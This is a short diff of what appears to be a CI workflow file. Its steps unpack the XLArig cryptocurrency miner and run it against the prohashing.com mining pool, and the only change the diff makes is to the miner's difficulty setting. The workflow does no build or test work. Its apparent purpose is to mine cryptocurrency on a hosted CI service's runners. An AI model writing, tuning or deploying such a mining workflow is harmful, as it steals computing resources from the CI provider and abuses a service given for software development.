@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive XLArig-v5.2.2-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://prohashing.com:3359 -p a=randomx,n=w1,d=10001 -a rx -k -t 1 --cpu-max-threads-hint 25 -u test213
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o stratum+tcp://prohashing.com:3359 -p a=randomx,n=w1,d=60006 -a rx -k -t 1 --cpu-max-threads-hint 25 -u test213
     - name: DONE
       run: exit
